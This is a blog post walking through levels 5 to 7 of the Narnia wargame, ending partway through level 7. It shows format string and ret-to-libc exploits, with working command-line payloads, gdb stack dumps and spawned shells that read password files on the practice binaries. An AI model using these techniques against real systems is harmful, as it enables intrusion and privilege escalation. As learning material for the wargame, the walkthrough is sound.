<!DOCTYPE html>
<html lang="en">
<head>
		<title>Unlogic &mdash; Solving Narnia Part 2</title>
		<meta charset="utf-8" />
		<link rel="profile" href="http://gmpg.org/xfn/11" />
		<link rel="stylesheet" type="text/css" href="http://unlogic.co.uk/theme/css/style.css" />
        <link rel="stylesheet" type="text/css" href="http://unlogic.co.uk/theme/css/pygments.css" />
		<link rel='stylesheet' id='oswald-css'  href='http://fonts.googleapis.com/css?family=Oswald&#038;ver=3.3.2' type='text/css' media='all' />
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
        <link href='https://fonts.googleapis.com/css?family=Cousine' rel='stylesheet' type='text/css'>
		<style type="text/css">
			body.custom-background { background-color: #f5f5f5; }
		</style>
		<link rel="alternate" type="application/atom+xml"
			title="Unlogic — Flux Atom"
			href="http://unlogic.co.uk/" /> 
		<link rel ="alternate" type="application/rss+xml"
			title="Unlogic — Flux RSS"
			href="http://unlogic.co.uk/feed.xml" /> 
		<!--[if lte IE 8]><script src="http://unlogic.co.uk/theme/js/html5shiv.js"></script><![endif]-->
</head>

<body class="home blog custom-background single-author" >
	<div id="container">
		<div id="header">
				<h1 id="site-title"><a href="http://unlogic.co.uk/">Unlogic</a></h1>
<h2 id="site-description">I've got a keyboard, a terminal, and a whole load of luck</h2>		</div><!-- /#banner -->
		
		<div id="menu">
            <div class="menu-social-container">
                <ul id="menu-social" class="social">
                    <li><a href="https://twitter.com/binaryheadache"><i class="fa fa-twitter-square fa-2x"></i></a></li>
                    <li><a href="https://github.com/svenito"><i class="fa fa-github-square fa-2x"></i></a></li>
                    <li><a href="http://unlogic.co.uk/feed.xml"><i class="fa fa-rss-square fa-2x"></i></a></li>
                </ul>
            </div>
			<div class="menu-navigation-container">
                
                <ul id="menu-navigation" class="menu">
						<li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://unlogic.co.uk/pages/all-posts.html">All posts</a></li>

				</ul>
			</div> <!--/#menu-navigation-container-->
            <div style="clear: both;"></div>
		</div><!-- /#menu -->
		
		<div class="page-title">
		</div>
	
		<div id="contents">

<div class="post type-post status-publish format-standard hentry category-general" id="post">
	<div class="entry-meta">
		<div class="date"><a href="http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/">Mon 13 April 2015</a></div>
			<div class="comments"><a href="http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/#disqus_thread" title="Comment on Solving Narnia Part 2">comments</a></div>
	</div> <!-- /#entry-meta -->
	<div class="main">
		<h2 class="entry-title">
			<a href="http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/" title="Permalink to Solving Narnia Part 2" rel="bookmark">Solving Narnia Part 2</a>
		</h2>
		<div class="entry-content">
			<p>Carrying on from <a class="reference external" href="http://unlogic.co.uk/2015/04/08/solving-narnia-part1/">Part 1</a></p>
<div class="section" id="level-05">
<h2>Level 05</h2>
<pre class="code c literal-block">
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

        <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">buffer</span><span class="p">[</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Change i's value from 1 -&gt; 500. &quot;</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">==</span><span class="mi">500</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;GOOD</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
                <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;No way...let me give you a hint!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buffer : [%s] (%d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
        <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;i = %d (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre>
<p>A fixed sized buffer again. This time however trying to overflow it in order to
write to <code>i</code> won't work. If we look at line 9 and lookup the manpage for <code>snprintf</code>
we see that</p>
<blockquote>
The  functions  snprintf() and vsnprintf() write at most size bytes
(including the trailing null byte ('0')) to str.</blockquote>
<p>So we won't be able to overflow this buffer. Going through the usual possible exploits
we've only really go one more to try: <a class="reference external" href="https://en.wikipedia.org/wiki/Uncontrolled_format_string">format string attack</a> or
<em>uncontrolled format string vulnerability</em>. This happens when user input
isn't checked, and allows the user to use format characters (<code>%s</code>, <code>%x</code>) to read or
manipulate the stack.</p>
<p>For me this is one of the harder exploits to understand, so this level is
great practice for me. So if it doesn't make sense at first, stick with it and
try various strings. Hopefully you'll grok it at some point.</p>
<p>Let's check to see if our hunch is right. Using a few characters to start, I
then append a list of <code>%x</code>, which read values from the stack and print them.</p>
<pre class="code console literal-block">
<span class="gp">narnia5&#64;melinda:/narnia$</span> ./narnia5 <span class="sb">`</span>python -c <span class="s2">&quot;print 'aaaa'+'%x'*10&quot;</span><span class="sb">`</span>
<span class="go">Change i's value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [aaaaf7eb75b6ffffffffffffd6aef7e2fbf8616161616265376636623537666] (63)
i = 1 (0xffffd6cc)</span>
</pre>
<p>Sure enough we see the beginning of the input string after the 4th <code>%x</code>. So we then
put the address if <code>i</code> into that location like and shorten the number of <code>%x</code>.</p>
<pre class="code console literal-block">
<span class="gp">narnia5&#64;melinda:/narnia$</span> ./narnia5 <span class="sb">`</span>python -c <span class="s2">&quot;print '\xcc\xd6\xff\xff'+'%x'*5&quot;</span><span class="sb">`</span>
<span class="go">Change i's value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8ffffd6cc] (44)
i = 1 (0xffffd6cc)</span>
</pre>
<p>Now we have the address of <code>i</code>, we use <code>%n</code> to write to that address, remembering
to remove one <code>%x</code> to keep the right length.</p>
<pre class="code console literal-block">
<span class="gp">narnia5&#64;melinda:/narnia$</span> ./narnia5 <span class="sb">`</span>python -c <span class="s2">&quot;print '\xcc\xd6\xff\xff'+'%x'*4 + '%n'&quot;</span><span class="sb">`</span>
<span class="go">Change i's value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8] (36)
i = 36 (0xffffd6cc)</span>
</pre>
<p>So we see that we've written the length of the string into <code>i</code>. We already have
a value of 36, but we need 500. To achieve this we need to pad the string.</p>
<pre class="code console literal-block">
<span class="o"></span><span class="gp">narnia5&#64;melinda:/narnia$ ./narnia5 $</span><span class="o">(</span>python -c <span class="s2">&quot;print '\xcc\xd6\xff\xff'+'%x'*3 + '%500d' + '%n'&quot;</span><span class="o">)</span>
<span class="go">Change i's value from 1 -&gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6ae                                   ] (63)
i = 528 (0xffffd6cc)</span>
</pre>
<p>We're <em>28</em> over the target, so let's reduce the padding</p>
<pre class="code console literal-block">
<span class="o"></span><span class="gp">narnia5&#64;melinda:/narnia$ ./narnia5 $</span><span class="o">(</span>python -c <span class="s2">&quot;print '\xcc\xd6\xff\xff'+'%x'*3 + '%472d' + '%n'&quot;</span><span class="o">)</span>
<span class="go">Change i's value from 1 -&gt; 500. GOOD
</span><span class="gp">$</span> whoami
<span class="go">narnia6
</span><span class="gp">$</span> cat /etc/narnia_pass/narnia6
<span class="go">[password]</span>
</pre>
</div>
<div class="section" id="level-06">
<h2>Level 06</h2>
<pre class="code c literal-block">
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>

<span class="c1">// tired of fixing values...
// - morla
</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
       <span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;movl %esp,%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
               <span class="s">&quot;and $0xff000000, %eax&quot;</span>
               <span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
        <span class="kt">char</span> <span class="n">b1</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span> <span class="n">b2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
        <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">puts</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>

        <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">!=</span><span class="mi">3</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s b1 b2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>

        <span class="cm">/* clear environ */</span>
        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
        <span class="cm">/* clear argz    */</span>
        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="n">memset</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>

        <span class="n">strcpy</span><span class="p">(</span><span class="n">b1</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
        <span class="c1">//if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)
</span>        <span class="k">if</span><span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">fp</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">==</span> <span class="n">get_sp</span><span class="p">())</span>
                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">fp</span><span class="p">(</span><span class="n">b1</span><span class="p">);</span>

        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</pre>
<p>In this rather complicated looking listing we notice a few things:</p>
<ul class="simple">
<li>line 17 is a function pointer to <code>puts</code></li>
<li>line 33 calls the function <code>fp</code> points to</li>
<li>line 31 prevents <code>fp</code> from pointing to anything in our frame</li>
</ul>
<p>The last lines means we need to point <code>fp</code> to a call in a system library.
This is going to be a <a class="reference external" href="https://en.wikipedia.org/wiki/Return-to-libc_attack">ret to libc attack</a>. We
need to find the location of the function we want to execute. We want a shell, so our
best option would be to execute <code>system('/bin/sh')</code>. As luck would have it, <code>puts</code> and
<code>system</code> both have the same function definition: <code>int system(const char *command);</code> and
<code>int puts(const char *s);</code></p>
<p>Let's fire up gdb and figure out our addresses.</p>
<pre class="code console literal-block">
<span class="gp">narnia6&#64;melinda:/narnia$</span> gdb ./narnia6 -q
<span class="go">Reading symbols from ./narnia6...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x08048559 &lt;+0&gt;:     push   %ebp
   0x0804855a &lt;+1&gt;:     mov    %esp,%ebp
   0x0804855c &lt;+3&gt;:     push   %ebx
   0x0804855d &lt;+4&gt;:     and    $0xfffffff0,%esp
   0x08048560 &lt;+7&gt;:     sub    $0x30,%esp

    &lt;-- snip --&gt;

   0x0804869b &lt;+322&gt;:   movl   $0xffffffff,(%esp)
   0x080486a2 &lt;+329&gt;:   call   0x8048410 &lt;exit&#64;plt&gt;
   0x080486a7 &lt;+334&gt;:   lea    0x20(%esp),%eax
   0x080486ab &lt;+338&gt;:   mov    %eax,(%esp)
   0x080486ae &lt;+341&gt;:   mov    0x28(%esp),%eax
   0x080486b2 &lt;+345&gt;:   call   *%eax                &lt;-- calling *fp*
   0x080486b4 &lt;+347&gt;:   movl   $0x1,(%esp)
   0x080486bb &lt;+354&gt;:   call   0x8048410 &lt;exit&#64;plt&gt;
End of assembler dump.

(gdb) break *0x080486b2
Breakpoint 1 at 0x80486b2
(gdb) r aaaaaaaabbbb ccccccccdddd
Starting program: /games/narnia/narnia6 aaaaaaaabbbb ccccccccdddd

Breakpoint 1, 0x080486b2 in main ()
(gdb) x/50wx $esp
0xffffd680:     0xffffd6a0      0xffffd8ac      0x00000021      0x08048712
0xffffd690:     0x00000003      0xffffd754      0x63636363      0x63636363
0xffffd6a0:     0x64646464      0x61616100      0x62626262      0x00000000
0xffffd6b0:     0x080486c0      0xf7fca000      0x00000000      0xf7e3ca63
0xffffd6c0:     0x00000003      0xffffd754      0xffffd764      0xf7feacea
0xffffd6d0:     0x00000003      0xffffd754      0xffffd6f4      0x08049978
0xffffd6e0:     0x08048290      0xf7fca000      0x00000000      0x00000000
0xffffd6f0:     0x00000000      0x32aaee13      0x0a932a03      0x00000000
0xffffd700:     0x00000000      0x00000000      0x00000003      0x08048450
0xffffd710:     0x00000000      0xf7ff0500      0xf7e3c979      0xf7ffd000
0xffffd720:     0x00000003      0x08048450      0x00000000      0x08048471
0xffffd730:     0x08048559      0x00000003      0xffffd754      0x080486c0
0xffffd740:     0x08048730      0xf7feb180
(gdb) p system
</span><span class="nv"></span><span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7e62cd0 &lt;system&gt;
<span class="go">(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()</span>
</pre>
<p>What I did here was to disassemble the <code>main</code> function and find out where
<code>fp</code> is getting called, so that I can set a breakpoint on it. Then I
run the binary and inspect the stack before the call to <code>fp</code>. What we see is
that <code>$esp</code> points to <code>0xffffd6a0</code>, which is where the last 4 values of
<code>b2</code> are stored. This is also the argument that will be passed to the <code>fp</code> call.
Function arguments are pushed onto the stack before a function is called. So
We want this to point to <code>/bin/sh</code>, and we want <code>fp</code> to point to <code>system</code>. This is
the reason for the <code>p system</code>, it tells us the location of <code>system</code>.
Also note that our <code>segfault</code> is showing us the last
4 digits of <code>b1</code>. Perfect, I can use that to overwrite <code>fp</code> with the address of
<code>system</code> and I should be good to go.</p>
<p>As this is a little more advanced, let's go over the steps:</p>
<ul class="simple">
<li>Get the address of the argument to whatever <code>fp</code> points to</li>
<li>Figure out how to overwrite that with our argument</li>
<li>Get the address of <code>system</code></li>
<li>Overwrite what <code>fp</code> points to with <code>system</code>'s address</li>
<li>Assemble payload and hopefully get a shell</li>
</ul>
<p>So the last step:</p>
<pre class="code console literal-block">
<span class="gp">narnia6&#64;melinda:/narnia$</span> /games/narnia/narnia6 <span class="sb">`</span>python -c <span class="s2">&quot;print 'a'*8 + '\xd0\x2c\xe6\xf7' +' '+ 'b'*8 + '/bin/sh'&quot;</span><span class="sb">`</span>
<span class="gp">$</span> whoami
<span class="go">narnia7
</span><span class="gp">$</span> cat /etc/narnia_pass/narnia7
<span class="go">[password]</span>
</pre>
</div>
<div class="section" id="level-07">
<h2>Level 07</h2>
<pre class="code c literal-block">
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">();</span>
<span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">();</span>

<span class="kt">int</span> <span class="nf">vuln</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ptrf</span><span class="p">)();</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;goodfunction() = %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">goodfunction</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;hackedfunction() = %p</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">hackedfunction</span><span class="p">);</span>

    <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;before : ptrf() = %p (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ptrf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptrf</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I guess you want to come to the hackedfunction...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
    <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>

    <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ptrf</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">){</span>
            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Usage: %s &lt;buffer&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome to the goodfunction, but i said the Hackedfunction..</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Way to go!!!!&quot;</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre>
<p>The presence of <code>snprintf</code> indicates that this will be another format string attack.
Great, another one of my least favourites. This should help imprint it on my
brain though, so let's attack this</p>
<pre class="code console literal-block">
<span class="go">(gdb) disass vuln
Dump of assembler code for function vuln:
   0x080485cd &lt;+0&gt;:     push   %ebp
   0x080485ce &lt;+1&gt;:     mov    %esp,%ebp
   0x080485d0 &lt;+3&gt;:     sub    $0xa8,%esp
   0x080485d6 &lt;+9&gt;:     movl   $0x80,0x8(%esp)
   0x080485de &lt;+17&gt;:    movl   $0x0,0x4(%esp)
   0x080485e6 &lt;+25&gt;:    lea    -0x88(%ebp),%eax
   0x080485ec &lt;+31&gt;:    mov    %eax,(%esp)
   0x080485ef &lt;+34&gt;:    call   0x80484b0 &lt;memset&#64;plt&gt;
   0x080485f4 &lt;+39&gt;:    movl   $0x80486e0,0x4(%esp)
   0x080485fc &lt;+47&gt;:    movl   $0x80487d0,(%esp)
   0x08048603 &lt;+54&gt;:    call   0x8048420 &lt;printf&#64;plt&gt;
   0x08048608 &lt;+59&gt;:    movl   $0x8048706,0x4(%esp)
   0x08048610 &lt;+67&gt;:    movl   $0x80487e5,(%esp)
   0x08048617 &lt;+74&gt;:    call   0x8048420 &lt;printf&#64;plt&gt;
   0x0804861c &lt;+79&gt;:    movl   $0x80486e0,-0x8c(%ebp)
   0x08048626 &lt;+89&gt;:    mov    -0x8c(%ebp),%eax
   0x0804862c &lt;+95&gt;:    lea    -0x8c(%ebp),%edx
   0x08048632 &lt;+101&gt;:   mov    %edx,0x8(%esp)
   0x08048636 &lt;+105&gt;:   mov    %eax,0x4(%esp)
   0x0804863a &lt;+109&gt;:   movl   $0x80487fd,(%esp)
   0x08048641 &lt;+116&gt;:   call   0x8048420 &lt;printf&#64;plt&gt;
   0x08048646 &lt;+121&gt;:   movl   $0x8048818,(%esp)
   0x0804864d &lt;+128&gt;:   call   0x8048450 &lt;puts&#64;plt&gt;
   0x08048652 &lt;+133&gt;:   movl   $0x2,(%esp)
   0x08048659 &lt;+140&gt;:   call   0x8048440 &lt;sleep&#64;plt&gt;
   0x0804865e &lt;+145&gt;:   movl   $0x80486e0,-0x8c(%ebp)
   0x08048668 &lt;+155&gt;:   mov    0x8(%ebp),%eax
   0x0804866b &lt;+158&gt;:   mov    %eax,0x8(%esp)
   0x0804866f &lt;+162&gt;:   movl   $0x80,0x4(%esp)
   0x08048677 &lt;+170&gt;:   lea    -0x88(%ebp),%eax
   0x0804867d &lt;+176&gt;:   mov    %eax,(%esp)
   0x08048680 &lt;+179&gt;:   call   0x80484c0 &lt;snprintf&#64;plt&gt;
   0x08048685 &lt;+184&gt;:   mov    -0x8c(%ebp),%eax
   0x0804868b &lt;+190&gt;:   call   *%eax
   0x0804868d &lt;+192&gt;:   leave
   0x0804868e &lt;+193&gt;:   ret
End of assembler dump.
(gdb) break *0x08048685</span>
</pre>
<p>So disassmble the <code>vuln</code> function and set a break point just
before the call of the function pointer. In the process of this challenge
I learned of a nice way to determine the number of <code>%x</code> you need. Using
<code>ltrace</code> it's possible to increment the number of <code>%x</code> 's until you
see your string in the output again. I'll paste only the correcy output here</p>
<pre class="code console literal-block">
<span class="gp">narnia7&#64;melinda:/narnia$</span> ltrace ./narnia7 <span class="sb">`</span>python -c <span class="s2">&quot;print 'aaaabbbb' + '%x'*7&quot;</span><span class="sb">`</span>
<span class="go">__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 &lt;unfinished ...&gt;
memset(0xffffd630, '\0', 128)                                = 0xffffd630
printf(&quot;goodfunction() = %p\n&quot;, 0x80486e0goodfunction() = 0x80486e0
)                   = 27
printf(&quot;hackedfunction() = %p\n\n&quot;, 0x8048706hackedfunction() = 0x8048706

)               = 30
printf(&quot;before : ptrf() = %p (%p)\n&quot;, 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
) = 41
puts(&quot;I guess you want to come to the &quot;...I guess you want to come to the hackedfunction...
)                  = 50
sleep(2)                                                     = 0
snprintf(&quot;aaaabbbb8048238ffffd688f7ffda940&quot;..., 128, &quot;aaaabbbb%x%x%x%x%x%x%x&quot;, 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55
puts(&quot;Welcome to the goodfunction, but&quot;...Welcome to the goodfunction, but i said the Hackedfunction..
)                  = 61
fflush(0xf7fcaac0)                                           = 0
exit(0 &lt;no return ...&gt;
+++ exited (status 0) +++</span>
</pre>
<p>You can see the <em>aaaa</em> and <em>bbbb</em> at line 14. So we have 7 <code>%x</code> to get the second value.</p>
<p>Let's take a look at the stack with that input</p>
<pre class="code console literal-block">
<span class="go">(gdb) r $(python -c &quot;print 'aaaabbbb' + '%x'*7&quot;)
Starting program: /games/narnia/narnia7 $(python -c &quot;print 'aaaabbbb' + '%x'*7&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:     0xffffd610      0x00000080      0xffffd8a2      0x08048238
0xffffd600:     0xffffd668      0xf7ffda94      0x00000000      0x080486e0
0xffffd610:     0x61616161      0x62626262      0x38343038      0x66383332
0xffffd620:     0x64666666      0x66383636      0x64666637      0x30343961
0xffffd630:     0x38343038      0x36306536      0x36313631      0x36313631
0xffffd640:     0x36323632      0x00323632      0x00000000      0x00000000
0xffffd650:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd660:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd670:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd680:     0x00000000      0x00000000      0x00000000      0x00000000</span>
</pre>
<p>So at <code>0xffffd60c</code> is the address of <code>goodfunction</code>. We need to overwrite that
to point to <code>0x8048706</code>, our <code>hackedfunction</code>. So as before in <a class="reference external" href="http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05">level 05</a>
we use <code>%n</code> to try and overwrite this value.</p>
<pre class="code bash literal-block">
<span class="o">(</span>gdb<span class="o">)</span> r <span class="k">$(</span>python -c <span class="s2">&quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*6 + '%n'&quot;</span><span class="k">)</span>

Starting program: /games/narnia/narnia7 <span class="k">$(</span>python -c <span class="s2">&quot;print 'aaaa\x0c\xd6\xff\xff' + '%x'*6 + '%n'&quot;</span><span class="k">)</span>
goodfunction<span class="o">()</span> <span class="o">=</span> 0x80486e0
hackedfunction<span class="o">()</span> <span class="o">=</span> 0x8048706

before : ptrf<span class="o">()</span> <span class="o">=</span> 0x80486e0 <span class="o">(</span>0xffffd60c<span class="o">)</span>
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln <span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span> x/40wx <span class="nv">$esp</span>
0xffffd5f0:     0xffffd610      0x00000080      0xffffd8a2      0x08048238
0xffffd600:     0xffffd668      0xf7ffda94      0x00000000      0x0000002f
0xffffd610:     0x61616161      0xffffd60c      0x38343038      0x66383332
0xffffd620:     0x64666666      0x66383636      0x64666637      0x30343961
0xffffd630:     0x38343038      0x36306536      0x36313631      0x00313631
0xffffd640:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd650:     0x00000000      0x00000000      0x00000000      0x00000000
